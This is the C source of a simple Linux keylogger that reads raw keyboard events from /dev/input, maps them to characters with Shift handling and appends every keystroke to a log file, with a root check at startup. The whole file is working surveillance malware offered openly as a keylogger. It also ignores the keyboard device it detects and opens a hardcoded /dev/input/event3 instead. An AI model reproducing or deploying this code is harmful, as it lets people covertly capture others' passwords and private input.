/* 
 *Simple C program/kernel module to save keystrokes to a file
 *Author: Meghraj Bendre <bendremeghraj@gmail.com>
 *
 * Implemented using the Linux Input Event Interface 
 * */
#include "keylogger.h"

/*
 *Check if the pressed key is Shift or not 
 * 
 */
int isShift(unsigned int key_code) {
    return key_code == KEY_LEFTSHIFT || key_code == KEY_RIGHTSHIFT;
}

/*
 * Information regarding all devices in use is displayed by /proc/bus/input/devices
 * Keyborad device file has EV == 120013
 * 'grep -B1' starts printing from one line before the macthing line
 * 'grep -Eo pattern' matches with only the word instead of a line with the pattern
 * 'tr' truncates newlines and end of the string
 */

char* get_current_keyboard_device() {

    FILE *pipe;
    char event_name[10];

    const char* cmd = 
    "grep -E 'Handlers|EV' /proc/bus/input/devices"
    "| grep -B1 120013"
    "| grep -Eo event[0-9]+"
    "| tr '\\n' '\\0'";

    /*open pipe to execute the shell cmd*/
    pipe = popen(cmd,"r"); 
    if (pipe==NULL) {
        fprintf(stdout,"Aborted! Command to get keyboard device file name failed\n");
        exit(-1);
    }
    fgets(event_name, 10, pipe);
    fclose(pipe);

    strcat(kbd_device_name, event_name);
    return kbd_device_name;
}

//#include "keylogger.h"
int main(int argc, char *argv[]) {

    struct input_event input_ev;
    
    /*check if user is root*/
    if (geteuid() != 0) {
        fprintf(stdout,"Aborted! You are not root user\n");
        exit(-1);
    }
    
    /*get keyboard device file name which is required by file descriptor*/
    get_current_keyboard_device();
    /*open file descriptor for the current keyboard device*/
    int fd = open("/dev/input/event3", O_RDONLY); //open the input driver 
    if (fd < 0){
        perror("Failed to open the device...");
        exit(1);
    }    

    FILE *fp = fopen(LOGFILE, "a+");
    if (!fp){
        perror("ERROR: Failed to open log file!");
        exit(1);
    }


    /*Get keys pressed by the user*/
    while(1) {
        read(fd, &input_ev, sizeof(struct input_event));

        /*Check if key pressed in shift*/
        if((input_ev.type == EV_KEY) && (input_ev.value == 1)) {    
            if(isShift(input_ev.code)){
                shift_check = 1;
                continue;
            }
        } else if((input_ev.type == EV_KEY) && (input_ev.value == 0)) {
            /*input_event.type specifies the input type/method which is key in our case
            * input_event.value == 0 specifies key_release
            */
            if(isShift(input_ev.code)) {
                shift_check = 0;
                continue;
            }
            else {
                if(!shift_check)
                    fprintf(fp, "%s", key_map[input_ev.code][0]);
                else
                    fprintf(fp, "%s", key_map[input_ev.code][1]);
                    
                fflush(fp);
            }
        }
    }

    fclose(fp);
    close(fd);
    
    return 0;
}
